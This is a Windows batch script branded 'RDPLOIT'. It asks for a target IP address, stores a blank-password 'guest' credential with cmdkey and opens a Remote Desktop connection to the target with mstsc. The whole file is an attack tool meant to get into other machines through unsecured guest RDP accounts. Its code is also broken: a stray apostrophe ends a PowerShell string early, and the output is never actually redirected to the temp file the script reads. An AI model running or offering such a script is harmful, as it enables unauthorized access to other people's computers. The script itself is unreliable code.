@echo off
:start
powershell -Command "& {Add-Type -AssemblyName Microsoft.VisualBasic; [Microsoft.VisualBasic.Interaction]::InputBox('Enter The Target's IP Address:', 'RDPLOIT');}"\out.tmp
set /p ip=<%TEMP%\out.tmp
set msgBoxArgs="& {Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Messagebox]::Show('Starting remote connection to %ip%', 'RDPLOIT');}"\out.tmp
powershell -Command %msgBoxArgs%>nul
cmdkey /add:%ip% /user:guest /pass:""
mstsc -v "%ip%"
cmdkey /delete:%ip%
pause
exit